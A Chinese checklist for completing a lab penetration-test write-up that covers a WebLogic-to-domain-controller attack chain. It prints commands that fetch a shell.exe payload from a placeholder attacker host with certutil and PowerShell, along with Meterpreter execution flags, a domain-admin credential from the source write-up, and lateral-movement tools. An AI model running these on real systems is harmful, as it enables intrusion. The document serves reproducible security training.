## 补齐原则（先读这段）

```
✅ 只填自己在授权靶机环境里实际跑通、并看到预期结果的命令

```

这条纪律很重要：**一份标注了缺口的文档可以复现，一份掺了猜测的文档不能。**

## ① WebLogic 漏洞检测命令

**原文位置：** 第 3 节 · 外网探测后

**为什么重要：** 这是整条攻击链的**唯一入口**。缺了它，前面 nmap 扫出 7001 也接不下去。

**复现前需要先确定的信息：**

```
□ WebLogic 具体版本           → 访问 http://IP:7001/console/ 看页脚，或读 error 页特征
□ 具体产品版本号（10.3.6 / 12.2.1.3 / 12.2.1.4 ...）
□ JDK 版本（影响可用 gadget 链）
□ 7001 是否真的可访问（原文说返回 404，需确认是路径 404 还是服务异常）
```

**记录模板（复现时填写）：**

```
工具名称：        ____________________
工具版本：        ____________________
完整命令：        ____________________
输入参数含义：    ____________________
命中判据：        ____________________   ← 怎么知道检测成功了
目标版本：        ____________________
输出关键行：      ____________________
```

**补全标准：** 换一台同版本的 WebLogic 靶机，照抄这条命令能复现出同样的检测结果。

> ⚠️ 原文写「7001 返回 404 但端口开放，可能是 WebLogic」——**404 是路径不存在，不代表 WebLogic 不可用**。
> 复现时先确认 console 路径（`/console`、`/console/login/LoginForm.jsp`）再判断。

## ② WebShell 上传请求

**原文位置：** 第 3 节 · 「上传 WebShell」

**为什么重要：** 从「检测到漏洞」到「拿到命令执行」的关键一跳。

**复现前需要确定：**

```
□ 用的是哪种上传方式（漏洞直接写文件 / 管理后台上传 war / 反序列化落地）
□ WebShell 类型（jsp / jspx）
□ 落地路径（WebLogic 的部署目录，或临时可写目录）
□ 是否需要绕过认证（未授权 vs 需要凭据）
```

**记录模板：**

```
上传方式：        ____________________
WebShell 内容：   ____________________   ← 贴完整文件内容
上传请求原文：    ____________________   ← curl 命令 或 Burp 原始请求
落地绝对路径：    ____________________
访问验证 URL：    ____________________
返回特征：        ____________________
```

**补全标准：** 记录一条**原样可粘贴执行的 curl**（含全部 header），或一份完整的 Burp 原始请求。只写「用工具上传了」不算补齐。

## ③ shell.exe 上传命令

**原文位置：** 第 4.5 节 · 「将 shell.exe 上传到 Web 靶机」

**为什么重要：** 低难度但必填，否则链条断开。

**记录模板：**

```
上传通道：        □ MSF upload    □ certutil 远程拉取
                  □ powershell wget  □ WebShell 上传功能
                  □ 其他 __________
完整命令：        ____________________
落地路径：        ____________________
```

**常见形式参考（复现时择一验证，不要直接照抄）：**

```text
meterpreter > upload ./shell.exe c:\\Windows\\Temp\\shell.exe
certutil -urlcache -split -f http://<攻击机IP>/shell.exe C:\Windows\Temp\shell.exe
powershell -c "IWR http://<攻击机IP>/shell.exe -OutFile C:\Windows\Temp\shell.exe"
```

## ④ shell.exe 执行命令

**原文位置：** 第 4.5 节 · 「执行 shell.exe」

**为什么重要：** 决定是否能拿到会话。

**记录模板：**

```
执行方式：        ____________________
执行上下文：      □ 已有 shell  □ WebShell  □ 计划任务  □ 已有 Meterpreter
完整命令：        ____________________
是否后台执行：    ____________________
落地前是否被拦：  ____________________
```

**特别注意：**

```
□ 如果是在已上线的 Meterpreter 里执行，用 execute -H -i -f 或 execute -f
□ 如果是通过 WebShell 执行，注意父进程是 Web 服务进程，进程可能随请求结束而终止
□ 执行后回连失败时，先查 handler 的 payload 架构是否与 shell.exe 一致
```

> 🔴 **重要提醒：** 原文此处的 payload 与 handler 架构不一致（生成 x86 stageless、监听 x64 staged）。
> 复现时**必须先按命令整理文档第 4.3/4.4 节统一**，否则这一步怎么做都不会上线。
> 这也是为什么④要排在①-③之后单独验证——它依赖前面已修正。

## ⑤ fscan 实际执行参数

**原文位置：** 第 5.2 节 · 「上传 fscan 扫描内网」

**为什么重要：** 原文从 `getsystem` 失败转向内网，fscan 是转折点。参数不给，复现时扫不出东西。

**复现前需要确定：**

```
□ fscan 版本（不同版本参数有差异）
□ 扫描目标网段（原文未给，需从 Web 主机 ipconfig / arp -a 推）
□ 平台（Windows exe / Linux 二进制）
□ 是否走了代理（fscan 本身不支持代理，通常需先在跳板上执行）
```

**记录模板：**

```
fscan 版本：      ____________________
上传方式：        ____________________
上传路径：        ____________________
完整命令：        ____________________
扫描目标网段：    ____________________   ← 从哪儿得知的？
线程/超时参数：   ____________________
输出关键发现：    ____________________   ← 扫到了哪些主机和服务
```

**补全标准：** 命令能原样粘贴运行，且扫描结果能重现原文提到的内网主机发现。

## ⑥ 远程登录域控的完整命令

**原文位置：** 第 6 节 · 「使用 Administrator/Key-1122 远程登录域控」

**为什么重要：** 这是最终目标。缺了它整个 WP 停在「拿到凭据」这一步。

**复现前需要确定：**

```
□ 走的什么通道（隧道/代理是否已建好，域控 10.10.10.10 是内网地址）
□ 用哪种远程执行方式（原文未指明，不要假设是 PsExec）
□ 域控是否开放 445 / 135 / 3389
□ 凭据是否已验证有效
```

**记录模板：**

```
前提条件：        □ 隧道已建 ______  □ 代理已建 ______
使用工具：        ____________________
是否需哈希传递：  □ 是（用户：________）□ 否，用明文
完整命令：        ____________________
验证成功的判据：  ____________________
```

**几种可能方向（复现时逐一实测，不要预先断定原文用的是哪种）：**

| 方向 | 前提端口 |
|---|---|
| PsExec / impacket-psexec | 445 |
| WMI / impacket-wmiexec | 135 + 445 |
| RDP | 3389 |
| WinRM | 5985 / 5986 |

> ⚠️ 原文只说「远程登录域控」，**不能反推成 PsExec 或 RDP**。写这份清单的目的就是让你实测出到底是哪一种。

## ⑦ 内网隧道/代理建立方式（原文完全未提）

**原文位置：** 原文从 Web 主机（有内网卡 10.10.10.80）打到域控（仅内网 10.10.10.10），**中间必然建了隧道，但原文一个字都没写。**

**为什么重要：** 这是整条链路上**最大的一处逻辑缺口**。没有隧道，10.10.10.10 根本访问不到。

## 一句话
